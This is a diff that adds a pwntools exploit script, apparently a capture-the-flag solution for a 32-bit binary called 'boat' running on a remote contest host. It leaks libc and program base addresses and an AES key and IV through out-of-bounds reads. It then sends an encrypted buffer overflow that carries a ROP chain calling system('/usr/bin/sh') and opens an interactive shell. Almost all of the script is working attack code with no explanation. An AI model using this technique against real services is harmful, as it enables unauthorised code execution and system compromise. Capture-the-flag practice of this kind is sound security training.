@@ -1,0 +1,165 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+import time
+warnings.filterwarnings("ignore")
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.backends import default_backend
+import os
+from binascii import hexlify
+import random
+import signal
+import subprocess
+exe = ELF("./boat")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux.so.2")
+# context.log_level='debug'
+# p = remote("addr", 1337)
+# os.system("python3 ./chall-setup.py")
+# input()
+os.system("python3 ./chall-setup.py")
+p = remote('be.ax', 32624)
+# p2= process(["./boat","1032"])
+# process(["./boat","1033"])
+# process(["./boat","1035"])
+# process(["./boat","1024"])
+# p = process(["./boat","1031"])
+def gdbs():
+    gdb.attach(p, gdbscript="""
+    # brva 0x2826 
+    b*0x56558a73
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+def byte(byte_string):
+    byte_list = list(byte_string)
+    new_order = [7, 6, 5, 4, 3, 2, 1, 0]
+    rearranged_bytes = [byte_list[i] for i in new_order]
+    rearranged_byte_string = bytes(rearranged_bytes)
+    return rearranged_byte_string
+context.terminal = ['foot']
+def encrypt(data, key, iv):
+    # Initialize the cipher
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+
+    # Pad the data
+    padder = padding.PKCS7(algorithms.AES.block_size).padder()
+    padded_data = padder.update(data) + padder.finalize()
+
+    # Encrypt the data
+    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
+    return ciphertext
+
+def leak(index):
+    payload = b'a'*(7*2)
+    payload += b'a'*(4*2)
+    payload += hex(index&0xff).encode("utf-8")[2:].rjust(2,b"0")
+    # data = b"aaaa"*2+hex(index&0xff).encode("utf-8")[2:]
+    log.info(f"payload: {payload}")
+    send(payload)
+    logs()
+    p.recvuntil("received ")
+    return int(p.recvuntil(" bytes.",drop=True))&0xffffffff
+def gdb2():
+    gdb.attach(p2,"""
+           brva 0x0000280E
+           brva 0x00003DE6
+           """)
+def test(key,iv,libcs,base):
+    pop_esp = libcs+0x0017eefc
+    pop_ecx_edx = libcs+0x00037fec
+    pop_eax = libcs+0x00131e51
+    pop_ebx = libcs+0x00022f08
+    int_0x80 = libcs+0x3836e
+    push_edx = libcs+0x0019cdf8
+    push_edx_ecx_call = libcs+0x0008b8f2
+    pop_edx = libcs+0x00037fed
+    push_esi = libcs+0x00073d16
+    pop_esi = libcs+0x000209d9
+    pop_edi = libcs+ 0x000213a8
+    push_edi = libcs+0x00092c58
+    ret = libcs+0x0001f2ac
+    log.info(f"lenkey: {len(key)}")
+    log.info(f"len iv: {len(iv)}")
+    cmd_addr = base+29060
+    # contain flag.txt string
+    payload = b'a'*(7*2)
+    payload += b'a'*(4*2)
+    payload += b"08" # slot size index
+    payload += b"03"
+    payload += b"03"
+    payload += b"03"
+    payload += b"/usr/bin/sh".hex().encode()
+    send(payload)
+
+    payload = b'a'*(7*2)
+    payload += b'a'*(4*2)
+    # payload += hex(0x1).encode("utf-8")[2:]
+    payload += b"08" # slot size index
+    payload += b"04"
+    payload += b"04"
+    payload += b"03"
+    rop = flat(
+            pop_eax,
+            cmd_addr,
+            pop_ebx,
+            exe.sym._GLOBAL_OFFSET_TABLE_,
+            exe.plt.system,
+            cmd_addr,
+            )
+    enc = encrypt(b"a"*(92+14)+p32(cmd_addr-0x8)+bytes(rop),key,iv)
+    payload += enc.hex().encode()
+    log.info(f"enc: {(enc.hex())}")
+    gdbs()
+    send(payload)
+    gdb2()
+
+def logen():
+    sla(b'choice', b'1')
+def logs():
+    sla(b'choice', b'2')
+def send(data):
+    sla(b'choice', b'4')
+    sa(b'Message.', data)
+logen()
+# gdb.attach(p2,"""
+#            brva 0x2816
+#            """)
+sla(b'choice', b'5')
+p.recvuntil(b"Key: ")
+key = p.recvline()[:-1]
+p.recvuntil(b"IV: ")
+iv = p.recvline()[:-1]
+log.info(f"key: {key}")
+log.info(f"iv: {iv}")
+
+libc.address = leak(-17) - libc.sym.bind
+log.info(f"libc: {hex(libc.address)}")
+base = leak(-15) - exe.sym.__dso_handle
+log.info(f"base: {hex(base)}")
+key_=b""
+for i in range(8):
+    key_ += p32(leak(i+11))
+iv_=b""
+for i in range(4):
+    iv_+= p32(leak(i+18))
+log.info(f"1032 key {len(key_)}: {key_}")
+log.info(f"1032 iv {len(iv_)}: {iv_}")
+# print(leakstr)
+# log.info(f"len leakstr: {len(leakstr)}")
+exe.address = base
+test(key_,iv_,libc.address,base)
+
+p.interactive()
+p.close()
+# good luck pwning :)
+
